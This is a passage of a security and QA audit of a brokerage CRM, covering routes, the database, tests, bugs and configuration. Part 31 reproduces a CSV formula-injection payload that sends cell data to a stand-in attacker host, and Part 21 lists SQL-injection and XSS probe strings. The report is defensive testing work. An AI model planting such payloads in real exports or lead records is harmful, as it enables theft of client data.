onboarding a second brokerage, a live two-tenant isolation test is mandatory — listed as **I-06**. The lead
privacy policy itself flags this (§7: "the scope rule is per-user, not per-office").

---

# PART 19 — API AUDIT

**376 routes total · 149 in CRM scope · 107 Transaction Desk routes excluded.**

| Category | Count | Assessment |
|---|---|---|
| CRM routes requiring auth | 145 | All returned `401` anonymously (**RUN**) |
| Deliberately public | 4 | `campaigns/track/open`, `campaigns/track/click`, `campaigns/unsubscribe`, `meta/callback` |
| Signature-protected public | 2 | `meta/webhook` (GET+POST) → `403` unsigned |
| Missing ScreenGuard where `@Screen` present | **0** | — |
| Missing DTO validation | **0 found** — enum whitelists + `422` with field errors | **RUN** |
| Endpoints returning 5xx under probing | **0** | **RUN** |
| CSRF exemptions | Public tracking + webhooks only, by necessity | CODE |
| Rate limiting | Per-IP and per-account on auth; `RATE_LIMIT_ANON_PER_MINUTE` global | CODE |

**Public endpoint safety (RUN + CODE):** `track/open` returns a GIF regardless of token validity (correct — it
must not leak whether a recipient exists); `unsubscribe` with no valid token renders "Invalid link" rather than
acting.

The unsubscribe flow deserves specific credit, because the naive version of it is a live data-loss bug:
**`GET /api/campaigns/unsubscribe` only *asks*; the `POST` acts.** The reason is recorded in the controller —
corporate mail gateways (Proofpoint, Barracuda, Mimecast) prefetch every link in an email to scan for malware,
and a `GET` that acted was unsubscribing recipients at those organisations who had never opened the message.
The list eroded invisibly, and because the opt-out also flags the lead row, the damage was not confined to
campaigns. Opt-out is additionally **token-scoped per recipient** (`?c=<campaignId>&t=<token>`), so possession
of a campaign id is not enough to unsubscribe someone. Unsubscribe failures are logged at error level because
CASL requires the mechanism to work.

---

# PART 20 — DATABASE REVIEW

## Integrity (DB)

| Check | Result |
|---|---|
| Orphaned `lead_tasks` | **0** |
| Orphaned `lead_notes` | **0** |
| Soft-deleted leads | 986 (retained indefinitely — no retention policy, per policy §6) |
| Live leads | 1,057 |
| `notifications` unique dedupe index | ✅ `notifications_user_id_dedupe_key_key` |
| Meta dedupe | ✅ `leads_facebook_lead_id_key` |
| Email uniqueness per company/owner | ✅ `leads_company_owner_email_key`, `leads_company_email_lower_idx` |

## Indexes on `leads` (15)

Both ownership-scope columns are indexed — `leads_owner_user_id_idx` and `leads_assigned_to_idx` — which is what
lets the `OR` scope filter resolve by bitmap index scan rather than a sequential scan. Also indexed: `email`,
`lead_status`, `lead_source`, `deleted_at`, `phone_normalized`, `meta_campaign_id`, `company_id`, `unsubscribed`.

## 🟠 MIGRATION DRIFT — CONFIRMED

`prisma migrate diff --from-migrations --to-schema-datamodel` produces **DROP** statements, including:

```
ALTER TABLE "calendar_event_reminders" DROP CONSTRAINT "calendar_event_reminders_event_fk";
ALTER TABLE "calendar_events"          DROP CONSTRAINT "calendar_events_recurrence_fk";
ALTER TABLE "crm_settings"             DROP CONSTRAINT "crm_settings_company_id_fkey";
ALTER TABLE "crm_trigger_settings"     DROP CONSTRAINT "crm_trigger_settings_company_id_fkey";
ALTER TABLE "lead_import_jobs"         DROP CONSTRAINT "lead_import_jobs_company_id_fkey";
DROP INDEX "campaigns_scheduled_for_idx";
DROP INDEX "campaign_clicks_recipient_id_idx";
```

**Interpretation.** The migrations create constraints and indexes that `schema.prisma` does not declare. The
database is *ahead of* the schema file, not behind it. Nothing is broken today.

**The danger is a single command.** `prisma migrate dev` would resolve this drift by **dropping those foreign
keys and indexes**, silently removing referential integrity on calendar reminders and recurrence, and removing
the index the campaign scheduler uses. See **I-01**.

**69 migrations** are present (68 timestamped + `00000000000000_init`). Development and test databases both
report "up to date". **Production migration state is NOT VERIFIED** — no production access.

---

# PART 21 — SECURITY REVIEW

| ID | Area | Finding | Severity | Exploitability | Impact | Evidence | Fix |
|---|---|---|---|---|---|---|---|
| **S-01** | Output encoding | CSV formula injection in lead export | **Medium** | **High** — attacker-controlled via Meta lead form / CSV import | Formula executes in the exporter's spreadsheet; data exfiltration or command via DDE | **RUN** (reproduced) | Apply the audit export's guard to `downloadCsv` |
| **S-02** | Deployment | Schedulers default ON per process, no Redis lock | **Medium** | Low (config-dependent) | Duplicate client emails and duplicate reminders from a multi-process deploy | CODE + **RUN** | `RUN_SCHEDULERS=false` on all but one, or configure Redis |
| **S-03** | Architecture | `ScreenGuard` is not global | **Low** (latent) | None today | A future controller could enforce nothing silently | **RUN** (0 current cases) | Register globally, opt out explicitly |
| **S-04** | Dev hygiene | Development `.env` has no `MAIL_REDIRECT_TO` | **Medium** | N/A | Local test activity sends **real email to real clients** — observed live | **RUN** | Set `MAIL_REDIRECT_TO` in every non-production env |
| **S-05** | Credentials | Previously exposed secrets | **High** | N/A | Third-party account compromise | Prior session | Rotate all (see §36) |

## Areas reviewed and found sound

**Authentication** — session regeneration on login closes fixation; login uses equality, not `ILIKE`.
**Authorization** — three layers, all present, none bypassable in the tested surface.
**Session security** — Postgres-backed, `Secure`/`SameSite` enforced by the production preflight.
**CSRF** — verified live (`419` without token).
**IDOR** — 16 hostile operations, all refused, no data returned.
**SQL injection** — Prisma parameterised throughout; `'; DROP TABLE leads;--` stored as literal text, table
intact; `1';DROP--` as a path parameter → `400`.
**XSS** — React escapes by default. Exactly four `dangerouslySetInnerHTML` uses exist in the client, and each
was traced to its data source: **none renders lead-supplied data.** Two render a bundled FAQ document, one
renders an onboarding-email preview, and one (`EmailSettingsPanels.tsx:398`) renders
`POST /api/email-templates/{id}/preview` — brokerage-authored template HTML on a **Transaction Desk** settings
screen, outside CRM scope. An administrator writing HTML into their own email template is the normal, accepted
property of a template editor, not an injection path from an outside party.

The CRM path was tested adversarially rather than assumed: a lead named `<img src=x onerror="…">` was created
and `POST /api/campaigns/preview` requested against it. The endpoint returns an **audience count and a sample of
names**, not interpolated HTML — the raw `onerror=` string does not appear in the response (**RUN**). The Inbox
renders message bodies as text, never HTML (**TEST**).
**Token storage** — AES-256-GCM, domain-separated per feature, never plaintext-by-accident.
**Webhooks** — Meta webhook refuses unsigned requests with 403.
**Error disclosure** — no stack traces observed; campaign failure notifications deliberately exclude technical
detail (`"ECONNREFUSED 10.0.0.4:587"` stays in the log, not the user's inbox).
**Privilege escalation** — no role could reach another user's data; the CRM role cannot grant itself Meta rights.
**Mass assignment** — enum whitelists refuse unknown values; preference writes are self-scoped.

---

# PART 22 — ERROR HANDLING

| Failure | Handled | Logged | User sees | Retried | Data loss |
|---|---|---|---|---|---|
| Invalid form data | ✅ | — | `422` + per-field messages | — | No |
| Invalid CSRF | ✅ | ✅ | `419` | — | No |
| Unauthorized operation | ✅ | ✅ | `404`/`403` | — | No |
| Malformed id | ✅ | — | `400` | — | No |
| Meta not connected | ✅ | ✅ | `400` with reason | Next sweep | No |
| Audit write failure | ✅ | ✅ warn | Nothing (deliberate) | No | **Trail gap — alerted** |
| Notification dispatch failure | ✅ | ✅ warn | Nothing | Per-channel | No |
| Campaign terminal failure | ✅ | ✅ error | "Campaign could not be completed" | State machine | No |
| Redis absent | ✅ | ✅ | Nothing — degrades to in-process | — | No |
| Scheduler failure | ✅ | ✅ | `/health/workers` counter | Next tick | No |

**No 500 was produced by any probe in this audit.**

---

# PART 23 — PERFORMANCE

| Surface | Bound | Assessment |
|---|---|---|
| Lead list / search / feed | `MAX_PER_PAGE` clamped, nonsense values fall back | ✅ Safe |
| Recycle bin | Paginated (was a bare `take: 200`) | ✅ Safe |
| Audit listing | Paginated | ✅ Safe |
| Audit export | Hard cap 50,000 rows, truncation reported in headers | ✅ Safe |
| Lead export | Capped, truncation surfaced to the user with instructions | ✅ Safe |
| Dashboard | Aggregates via `liveLeadWhere`, both scope columns indexed | ✅ Safe |
| Calendar | Bounded by date range | ✅ Safe |
| IMAP polling | 60 s, concurrency-limited | ✅ Safe |
| **Campaign audience resolution** | 🟡 **Unbounded** — see below | Future scaling risk |

## 🟡 I-05 — Campaign audience loads every matching lead in full

`campaign-audience.service.ts:92` — `findMany({ where, orderBy })` with **no `take` and no `select`**: every
matching lead row is loaded in full into memory and deduped in JavaScript. Then `suppressedEmails()` issues
`WHERE email IN (...)` with one entry per recipient.

At today's 1,057 leads this is negligible. At tens of thousands it becomes a large heap allocation plus a very
large `IN` list. **Current impact: none. Scaling risk: real.** Classified P3, not a blocker.

---

# PART 24 — UX REVIEW

## Functional UX problems

1. **B-02 — "Client Reviews" is a dead sidebar link** for every role in the CRM area. Functional defect.
2. **B-01 — a truncated-then-weaponised export** is invisible to the user (see §31).

## UX done well (worth recording so it is not regressed)

- A truncated lead export **says so**, with the numbers and what to do: *"Exported the first 5,000 of 12,000
  leads — an export is capped at 5,000 rows. Narrow the filters and export in parts to get them all."* This
  replaced a silent cap on the file people use for migrations and for answering a client's request for their own
  data.
- Destructive actions confirm, and say where the record goes ("moves to Recently Deleted, where it can be
  restored") rather than just "Are you sure?".
- Validation messages are specific and human ("That is not a recognised lead source", not "Invalid input").
- Campaign failure notifications tell the owner what happened and where to look, without pasting an SMTP error
  into their inbox.

---

# PART 25 — CROSS-MODULE WORKFLOWS

| # | Workflow | Result | Evidence |
|---|---|---|---|
| 1 | **Manual lead**: create → assign → appears → dashboard → note → task → notification → audit | ✅ Confirmed end-to-end | **RUN** — creation, note, task, audit entry containing the probe stamp all verified |
| 2 | **Meta lead**: connect → receive → dedupe → lead → owner → dashboard → notify → history | 🟡 Partially confirmed — dedupe, owner, notification and history verified from code and DB indexes; **live OAuth and webhook delivery not exercised** | CODE + DB |
| 3 | **Lead follow-up**: lead → task → due date → reminder → notification → complete | ✅ Confirmed by **live scheduler run** | **RUN** |
| 4 | **Lead communication**: email → SMS → call → activity history | ✅ Confirmed (endpoints, permissions, isolation) | **RUN** + TEST |
| 5 | **CRM Inbox**: configure → receive → sync → match → read → reply → notify | 🟡 Partially confirmed — sync, match, read, notify verified; **live SMTP send not exercised** | **RUN** + TEST |
| 6 | **Campaign**: audience → template → schedule → send → track → bounce → unsubscribe → completion | 🟡 Partially confirmed — all stages verified by tests and probes; **no live bulk send performed** | TEST + **RUN** |

---

# PART 26 — CONCURRENCY / DUPLICATE PROCESSING

| Risk | Protection | State |
|---|---|---|
| Duplicate notifications | Unique index `(user_id, dedupe_key)` | ✅ **DB-enforced**, survives restart (**RUN**) |
| Duplicate Meta leads | Unique index on Meta's submission id | ✅ **DB-enforced** |
| Duplicate campaign sends | Campaign state machine + resume service | ✅ TEST |
| Duplicate IMAP processing | `clusterTick` (Redis lock) | 🟠 **Redis not configured — falls through to running** |
| Duplicate lead-task reminders | `clusterTick` + dedupe key | 🟠 Same, but dedupe key still protects the user |
| Settings write races | `pg_advisory_xact_lock` | ✅ CODE |

## 🟠 I-02 — The multi-process scheduler hazard

This is the finding most likely to cause a visible production incident, and it is a **configuration** issue, not
a code defect.

- `RUN_SCHEDULERS` defaults to **`true`** (`configuration.ts:69` — `bool(process.env.RUN_SCHEDULERS, true)`)
- It is **not set** in the environment file examined
- `clusterTick` deliberately **runs the tick when Redis is absent**, because failing closed would silently stop
  every scheduled job on every deployment that has no Redis — which is all of them today
- Redis is **not configured** (`/health/ready`: *"not configured — caching and distributed queues are off"*)

Therefore: **under pm2 cluster mode or more than one container, every process runs every scheduler.** The
notification dedupe index still prevents duplicate *notifications*, but IMAP polling would race on the same
mailbox, and anything that sends mail outside the dispatcher could double-send to real clients.

The code says this out loud in `common/schedulers.ts`: *"two IMAP syncs racing on one mailbox and two copies of
every reminder email arriving at a real client. Nothing in the application would report that; it would simply be
happening."*

**Mitigation is one line** — see §43.

---

# PART 27 — TEST SUITE AUDIT

## Server (Jest)

| Metric | Result |
|---|---|
| Suites | **92 passed / 92** |
| Tests | **1,398 passed / 1,398** |
| Failed | 0 |
| Skipped | 0 |

## End-to-end (Playwright, Chromium)

Clean run, freshly seeded database, no concurrent activity:

| Metric | Result |
|---|---|
| Tests | **381** |
| Passed | **379** |
| Failed | **2** |
| Skipped | 0 |
| Duration | 10.4 min |

### Both failures are test defects, not application defects — and this was proven, not assumed

Both are in `settings-high-fixes.spec.ts` ("H7 — the audit trail says which field changed"), and both are
**outside CRM scope** (Company Settings, queried with `area=desk`).

**The failure:**

```
Expected: "null"
Received: ""
   expect(hits[0].old_value).toBe(String(before.phone));
```

**Root cause.** On a freshly seeded company, `phone` and `account_no` are `NULL`. The assertion computes
`String(before.phone)`, which for `null` produces the four-character literal `"null"` — a value the application
would never store. The application correctly recorded `""` for "was not previously set". **The expectation is
wrong; the behaviour is right.**

**Proof, rather than argument.** The two fields were set to non-null values and the same three H7 tests re-run
with no other change:

```
3 passed (7.3s)
```

**Why this matters beyond these two tests.** They are **state-dependent**: they pass on an accumulated database
where those fields happen to be populated, and fail on a fresh seed. That is the failure mode that makes a
suite trustworthy on one machine and not another, and it is the reason the earlier historical run reported
381/381 — it ran against a database that had been used. Recorded as **I-11**.

## CRM-specific coverage by module

| Module | Dedicated spec files |
|---|---|
| Leads | `leads.spec.ts`, `leads-part2.spec.ts` |
| Campaigns | `campaigns.spec.ts` |
| Inbox | `inbox.spec.ts`, `imap-batch.spec.ts` |
| Meta | `meta-*.spec.ts` |
| Calendar | `calendar*.spec.ts`, `web-push.spec.ts` |
| Notifications | `notification-center.spec.ts`, `crm-events.spec.ts` |
| Audit + export | `audit-export.spec.ts` (server + e2e) |
| Authorization | `write-authorization.spec.ts`, `module-access.spec.ts`, `ownership.spec.ts` |
| Tenancy | `tenancy.spec.ts`, `tenant-context.spec.ts` |
| Auth/MFA | `authentication.spec.ts`, MFA suite |

## Test quality review — do the tests actually prove anything?

**Mostly yes, and with unusual discipline.** Specific evidence:

- `audit-export.spec.ts` asserts the **export answers exactly what the listing answers** for the same user,
  rather than asserting a hardcoded 403 — so the two cannot drift apart.
- It checks a real `.xlsx` by its **PK zip signature**, not by content-type alone.
- `write-authorization.spec.ts` ends with a test asserting *"agent and agent2 are genuinely different accounts"* —
  a fixture-integrity test, precisely the check that stops the whole file from passing vacuously.
- `tenancy.spec.ts` **fails the build** when a new table is unclassified, rather than testing existing tables.

**Weaknesses found:**

1. **The e2e suite ran green against an empty database at one point historically**, which is why seeded
   integration tests were added. The fixture-integrity pattern above is the durable fix; it is applied in the
   authorization spec but **not uniformly across every spec**.
2. **The lead CSV export has no test asserting formula neutralisation** — which is exactly why B-01 survived
   while the audit export's equivalent guard is tested. Listed as **I-09**.
3. Live external-provider failure paths (Meta token revoked, SMTP down, Twilio error) are covered by mocks only.
4. **The suite shares seven mutable fixture accounts and is not safe to run concurrently with anything else.**
   Established during this audit, and worth recording for QA (see below).

### A methodology note that QA should read

The first e2e run in this audit **failed extensively, and none of those failures were code defects.** They are
recorded here rather than quietly re-run, because the same trap will catch the next person.

**Two distinct causes, both the auditor's, both since identified.**

**Cause 1 — the sign-in lockout.** This audit's manual API probing signed in as the shared fixture accounts many
times, which tripped the per-account throttle: `agent@test.local` returned `429 "Too many failed sign-in attempts
for this account. Try again in 8 minute(s)."`. Tests then failed at `signIn()`, which looks exactly like a broken
application and was the opposite — the brute-force defence doing its job.

**Cause 2 — the emptied database, and this one is worth writing down.** The test database was twice found emptied
of users, leads, campaigns, audit rows and notifications mid-audit. It was first recorded here as observed but
unexplained. It has since been traced, and the culprit was the drift check in §20:

```
prisma migrate diff --from-migrations … --shadow-database-url "$TEST_DATABASE_URL"
```

**Prisma RESETS whatever database is given as `--shadow-database-url`.** It replays the whole migration history
into it to compute the comparison. Pointing that at `myapp_test` destroyed the seeded fixtures — and left the
database partially migrated with no `_prisma_migrations` table, which is a worse state than empty because it
still looks usable.

The e2e suite is **exonerated**: it does not truncate anything. Run against a freshly seeded database with
nothing else touching it, it passed 379/381, with the two failures analysed above.

Three durable lessons:

- **Never pass a database you care about as `--shadow-database-url`.** Use a dedicated throwaway (`myapp_shadow`)
  or let Prisma create one. This is the single most destructive footgun encountered in this audit, and it is
  silent — the command reports the diff perfectly while the target is wiped underneath it.
- **Never run the e2e suite while anything else is touching the test environment.** The fixture accounts are
  shared and mutable; the lockout is per-login-string and in-memory, so restarting the API clears it.
- **A `signIn()` failure across many specs is a symptom, not a diagnosis.** Check for `429`, and check that the
  fixtures still exist, before believing the application is broken. The per-account throttle is deliberately left
  at production strength in the e2e config (only the per-IP limit is raised), precisely so that a regression in
  it would still be caught.

---

# PART 29 — BROWSER / UI REVIEW

Browser-level verification was done through the Playwright suite driving a real Chromium instance against the
running SPA, rather than by manual clicking. **379 of 381 browser tests passed**, and the two failures are the
non-CRM test defects analysed in §27.

| Surface | Covered | Evidence |
|---|---|---|
| Navigation and role-specific menus | ✅ | `module-access.spec.ts` — a role without a module cannot see or reach it |
| Login form, CSRF exchange, cookie attributes, redirect | ✅ | `signIn()` goes through the real form, never a planted cookie |
| Forms, validation messages, buttons, modals | ✅ | Leads, campaigns, calendar, settings specs |
| Pagination, search, filtering | ✅ | `leads-part2.spec.ts` — pages do not overlap; a page beyond the end is empty, not an error |
| Permission-hidden functionality | ✅ | Hidden **and** refused by direct API call — the suite asserts both |
| Calendar month grid, "+N more", narrow viewport | ✅ | `calendar-more.spec.ts` |
| Screen matches API | ✅ | Several specs compare what is rendered against what the API returned |
| Loading / empty / error states | ✅ | Covered per module |

**What the suite proves that source review cannot:** that the screen and the API agree. Multiple specs assert
"what the screen shows matches what the API returned", which is the check that catches a UI quietly rendering
stale or differently-filtered data — the failure mode behind the historical dashboard-vs-Leads discrepancy.

**Screenshots, video and traces** were captured automatically for the two failures and are retained under
`e2e/test-results/`.

**Not covered:** manual exploratory clicking, cross-browser (Chromium only), and formal accessibility auditing
(no axe/WCAG run was performed — **NOT VERIFIED**).

---

# PART 30 — WHAT IS FULLY WORKING

| Module | Feature | Roles verified | Technical path verified | Tests | Status |
|---|---|---|---|---|---|
| Leads | List, search, filter, paginate | SA/Admin/Agent/CRM | UI→API→Guard→Scope→DB | ✅ | ✅ |
| Leads | Create / edit / soft delete / restore | Agent, Agent2 | Full | ✅ | ✅ |
| Leads | Notes, tasks, showings, calls, SMS, email, tags | Agent, Agent2 | Full | ✅ | ✅ |
| Leads | **Owner isolation (16 hostile ops)** | All four | Full | ✅ | ✅ |
| Leads | Import (job-based), bulk delete, transfer | SA, Agent | Full | ✅ | ✅ |
| Calendar | CRUD, recurrence, to-dos, reminders | Agent, Agent2, Admin | Full | ✅ | ✅ |
| Calendar | **Cross-user isolation** | Agent vs Agent2, Admin | Full | ✅ | ✅ |
| Campaigns | CRUD, templates, suppression, tracking, unsubscribe | All four | Full | ✅ | ✅ |
| Campaigns | Template isolation | Agent vs Agent2 | Full | ✅ | ✅ |
| Inbox | Sync, read/unread, lead match, notification | Agent, Agent2 | Full | ✅ | ✅ |
| Inbox | **Cross-user message access refused** | Agent | Full | ✅ | ✅ |
| Dashboard | Counts consistent with Leads screen | All four | Full | ✅ | ✅ |
| Audit | Listing, filters, domain isolation, permissions | All four | Full | ✅ | ✅ |
| **Audit Export** | **CSV + Excel, filters, redaction, formula guard, permissions** | SA/Admin allowed; Agent/CRM refused | Full | ✅ | ✅ |
| Notifications | Centre, unread/read, mark all, history, links | Agent, Agent2 | Full | ✅ | ✅ |
| Notifications | **All 6 CRM events wired; task-due proven live** | Agent | Full | ✅ | ✅ |
| Notifications | Per-channel preferences, 13 categories | Agent | Full | ✅ | ✅ |
| Auth | Login, session regeneration, CSRF, throttling | All | Full | ✅ | ✅ |
| Settings | Personal vs brokerage separation | Admin, Agent | Full | ✅ | ✅ |
| Triggers | Per-user trigger settings | Agent, CRM | Full | ✅ | ✅ |

---

# PART 31 — CONFIRMED BUGS

## 🔴 B-01 — CSV formula injection in the CRM lead export

| Field | Detail |
|---|---|
| **Module** | Leads → Export |
| **Severity** | **Medium** (High exploitability, moderate impact) |
| **Roles affected** | Every role that can export leads — Agent, CRM, Admin, Super Admin |
| **File** | `client/src/desk/LeadsPage.tsx:93–105` (`downloadCsv`) |

### Root cause

```ts
const escape = (v: unknown) => `"${String(v ?? '').replace(/"/g, '""')}"`;
```

This is *correct CSV quoting* — it prevents a value from breaking the CSV structure. It does **not** neutralise
spreadsheet formulas. A spreadsheet strips the surrounding quotes when parsing, and then evaluates any cell whose
content begins with `=`, `+`, `-`, `@`, tab or carriage return.

The server returns export rows as **JSON**; the CSV file is assembled in the browser. So the server-side guard
that exists elsewhere never applies here.

### Reproduction (performed, RUN)

1. Create a lead with `name` = `=HYPERLINK("http://attacker.example/?d="&A1,"Click for your report")`
   — accepted, `201`. This is a realistic value: **`lead_source` was set to `meta`**, i.e. the kind of value a
   Facebook lead-ad form or a CSV import delivers from outside the brokerage.
2. Export leads as that user → `200`.
3. The cell written to the file:

```
"=HYPERLINK(""http://attacker.example/?d=""&A1,""Click for your report"")"
```

4. After the spreadsheet strips CSV quoting, the cell begins with `=`. **The formula evaluates on open.**

### The control that proves it is a gap, not a design choice

The **same string**, exported through the **audit trail** export, comes out neutralised:

```
2026-08-06,17:08:11,Luis Moreau,agent,Lead created,Lead,Leads,,,,,"'=HYPERLINK(""http://attacker.exa…
```

`audit-export.service.ts:241` applies `if (/^[=+\-@\t\r]/.test(v)) v = `'${v}`;`. The CRM therefore has the
guard in one export path and not the other.

### Impact

`=HYPERLINK` exfiltrates neighbouring cell contents to an attacker-controlled URL when clicked. Other payloads
(`=cmd|'…'!A1` DDE) can attempt command execution in older/misconfigured Excel. The victim is a brokerage staff
member opening what they believe is their own lead list.

### Recommended fix

Apply the same guard the audit export already uses, in `downloadCsv`:

```ts
const escape = (v: unknown) => {
  let s = String(v ?? '');
  if (/^[=+\-@\t\r]/.test(s)) s = `'${s}`;
  return `"${s.replace(/"/g, '""')}"`;
};
```

**Better still:** move the serialisation server-side and reuse the audit export's writer, so there is one CSV
writer in the application rather than two.

### Affected files
`client/src/desk/LeadsPage.tsx` (primary). Audit the same pattern anywhere else a CSV is built in the browser.

### Regression risk
**Very low.** The change affects only cells that begin with a formula character; a leading apostrophe is the
standard spreadsheet escape and is not displayed as content by Excel, LibreOffice or Google Sheets.

### Required tests
1. Unit: `downloadCsv` prefixes `=`, `+`, `-`, `@`, tab, CR; leaves ordinary values untouched.
2. E2E: create a lead with a formula name, export, assert the cell is neutralised.
3. Regression: a normal export is byte-identical apart from neutralised cells.

---

## 🟠 B-02 — "Client Reviews" is dead navigation in the CRM

| Field | Detail |
|---|---|
| **Module** | CRM navigation / Client Reviews |
| **Severity** | **Low** (functional UX defect; no data or security impact) |
| **Roles affected** | All roles in the CRM area; the CRM/Marketing role most visibly (granted `edit`) |

### Root cause

Four places declare the screen; one does not exist:

| Declaration | Location | State |
|---|---|---|
| Screen label | `permission.service.ts:22` — `reviews: 'Client Reviews'` | ✅ present |
| Grant | CRM role gets `reviews: 'edit'`; others `view` via `fill('view')` | ✅ present |
| Area (server) | `SCREEN_DOMAIN.reviews = 'crm'` | ✅ present |
| Area (client) | `SCREEN_AREA.reviews = 'crm'` | ✅ present |
| Sidebar item | `DeskLayout.tsx:68` | ✅ renders |
| **Route** | `App.tsx` — 21 screen routes registered | ❌ **absent** |
| **Controller / service / table** | — | ❌ **absent** |

### Impact

Users see a "Client Reviews" item in the CRM sidebar that leads nowhere. A secondary effect: the CRM audit
filter offers a "Client Reviews" category that cannot match a CRM record, because actual review rows carry a
transaction id and `auditDomain()` classifies those as `desk`.

### Recommended fix

Product decision required — **do not implement blind**:

- **If deferred to a future version:** remove `reviews` from the CRM sidebar and from `SCREEN_AREA`/`SCREEN_DOMAIN`,
  keeping the permission definition if the Transaction Desk uses it. One-line nav change, no data risk.
- **If in scope:** build the route, page, controller and service.

### Affected files
`client/src/desk/DeskLayout.tsx`, `client/src/desk/area.ts`, `server/src/common/domain.ts`,
`server/src/auth/permission.service.ts`

### Regression risk
Low, but `domain.ts` and `area.ts` **must change together** — they are two halves of the same decision on
opposite sides of the wire, and `audit-domain.spec.ts` asserts their agreement.

---

# PART 32 — SECURITY FINDINGS

See the table in §21. Summary: **1 confirmed exploitable defect (S-01 / B-01)**, 1 deployment-configuration
hazard (S-02), 1 latent architectural risk (S-03), 1 development-hygiene issue (S-04), 1 outstanding credential
rotation (S-05).

**No critical security finding.** No authentication bypass, no authorization bypass, no IDOR, no injection, no
cross-user data exposure was found in the tested surface.

---

# PART 33 — PARTIALLY BUILT FEATURES

| Feature | State | Why not fully confirmed |
|---|---|---|
| Meta OAuth round trip | 🟡 | No live Meta connection; code paths and dedupe verified, provider interaction not |
| Inbox outbound send (SMTP) | 🟡 | Deliberately not exercised — would send real mail |
| Campaign bulk send at volume | 🟡 | No live bulk send performed; state machine and tracking verified |
| MFA end-to-end code entry | 🟡 | Covered by the Phase 3 suite; not re-driven through the UI in this audit |
| Multi-tenant isolation | 🟡 | Only one tenant exists — structurally sound, experimentally unverified |

---

# PART 34 — NOT IMPLEMENTED

## Required current-version gaps

**None.** All seven items named as required current-version CRM functionality are present and verified:

| Required item | State |
|---|---|
| Audit Export (CSV + Excel) | ✅ Confirmed — **RUN** |
| New Lead notification | ✅ Wired |
| Lead Assigned notification | ✅ Wired |
| Meta Lead Arrived notification | ✅ Wired |
| Lead Task Due notification | ✅ Confirmed by live scheduler run |
| Campaign Completed notification | ✅ Wired |
| Campaign Failed notification | ✅ Wired |

## Not required for current version

- Advanced Inbox draft management
- Advanced Inbox forwarding
- Conversation threading

These are absent. **They are not blockers**, and the application does not claim them.

## Intentionally deferred

- Opportunity Management / Opportunity Pipeline
- Google Calendar selection / categories

Not reported as defects anywhere in this audit.

## Undecided — needs a product call

- **Client Reviews as a CRM module** (B-02). Currently neither implemented nor removed. It is listed as a bug
  because it is *visible to users*, not because the feature is required.

---

# PART 35 — EXISTING FUNCTIONALITY AT RISK

| Risk | Existing functionality affected | Probability | Impact | Severity | Safe mitigation |
|---|---|---|---|---|---|
| **`prisma migrate dev` run against any real database** | Calendar reminder + recurrence referential integrity; campaign scheduler index | Medium | High | **High** | Use `migrate deploy` **only**. Never `migrate dev` outside a scratch DB |
| **Multi-process deploy without `RUN_SCHEDULERS=false`** | IMAP sync, reminders, campaign resume | Medium | High | **High** | Set it on every process but one; or configure Redis |
| **`APP_KEY` rotation** | Meta tokens, Google refresh tokens, stored IMAP/SMTP passwords, TOTP secrets | Medium | High | **High** | Plan re-connection + MFA re-enrolment; Meta/Google degrade to "reconnect", mail accounts and MFA do not |
| Outstanding production migrations | Any feature whose table is missing | Medium | High | **High** | Verify → back up → `migrate deploy` → verify |
| Lead privacy policy consequences | Manager oversight, compliance search, departed-agent books | High (by design) | Medium | **Medium** | Offboarding checklist must include ownership transfer |
| No lead retention policy | 986 soft-deleted leads retained indefinitely | High | Medium | **Medium** | Decide a retention rule if CASL/PIPEDA applies |
| Dev environment sends real mail | Client inboxes | Medium | Medium | **Medium** | `MAIL_REDIRECT_TO` in every non-production env |
| `ScreenGuard` not global | Any future controller | Low | High | **Medium** | Register globally with explicit opt-out |
| Tenant extension changes | All CRM data, if a 2nd tenant is added | Low today | Critical | **Medium** | Live two-tenant test before onboarding |
| Notification dispatcher changes | All 20 live notification pairs | Low | Medium | **Low** | Dedupe index + suite protect it |
| `docs/audit/` is untracked | Audit history | Medium | Low | **Low** | Commit the audit trail of audits |

---

# PART 36 — PRODUCTION CONFIGURATION

**Values are never shown.** State only. **These readings are from the development `.env`; production is NOT VERIFIED.**

| Setting | Dev state | Production requirement |
|---|---|---|
| `APP_KEY` | **Present, decodes to exactly 32 bytes — valid for AES-256** | Must be present and 32 bytes. **Boot fails otherwise** |
| `SESSION_SECRET` | Present | ≥32 chars, not the built-in default. **Boot fails otherwise** |
| `DATABASE_URL` | Present | Required |
| `COOKIE_SECURE` | Present | Must be `true`. **Boot fails otherwise** |
| `COOKIE_SAMESITE` | Present | `none` requires `COOKIE_SECURE=true` |
| `FRONTEND_URL` | Present | https, no trailing slash. **Boot fails otherwise** |
| `CORS_ORIGINS` | Present | Required |
| `META_APP_SECRET`, `META_PUBLIC_URL`, `META_WEBHOOK_VERIFY_TOKEN` | Present | https, reachable, no trailing slash |
| `GOOGLE_CLIENT_ID` / `GOOGLE_CLIENT_SECRET` | Present | Required for Google Calendar/Gmail |
| `VAPID_PUBLIC_KEY` / `VAPID_PRIVATE_KEY` | Present | Required for push |
| `CAMPAIGN_PUBLIC_URL` | Present | https, no trailing slash |
| `TWILIO_ACCOUNT_SID` | Present | Required for SMS/voice |
| `MLS_ACCESS_TOKEN` | **Empty** | Transaction Desk only — out of CRM scope |
| `REDIS_URL` | **Missing** | Optional. Absence = in-process queues, no distributed lock |
| `RUN_SCHEDULERS` | **Missing → defaults to `true`** | ⚠️ **Set `false` on every process but one** |
| `MAIL_REDIRECT_TO` | **Missing** | Must be **set in dev/staging**, unset in production |
| `NODE_ENV` | Present | `production` in production — this is what arms the preflight |

## The production preflight is a real safety net

`main.ts` calls `assertProductionConfig`, which **throws** when `NODE_ENV=production` and any of the above is
wrong. It cannot be deployed misconfigured by accident. Its own header states the reason:

> *"An empty APP_KEY silently becomes a 32-byte zero key, so secrets encrypt and decrypt happily until the day a
> real key is set and every stored credential turns to noise."*

## Credential rotation (S-05)

Previously exposed secrets must be rotated. Note two things that are **not** environment variables:

- **IMAP/SMTP passwords and Twilio credentials live in the database**, encrypted under `APP_KEY` — rotating them
  means updating each account in the app, not editing config.
- **Rotating `APP_KEY` itself** invalidates every value encrypted under it. Meta and Google surface as
  "reconnect"; mail accounts and TOTP enrolments require manual re-entry. Plan that explicitly.

---

# PART 37 — ENVIRONMENT HEALTH

| Check | State | Evidence |
|---|---|---|
| Disk | **8.1 GB free** (was ~105 MB — previously caused false e2e failures) | **RUN** |
| Database | `ok`, 1 ms | **RUN** |
| Storage | `ok`, 1 ms | **RUN** |
| Authorization store | `ok` — 6 roles, 137 grants | **RUN** |
| Redis | Not configured (queues in-process, 0 dead) | **RUN** |
| Schedulers | 8 registered, all `healthy: true`, 0 failures | **RUN** |
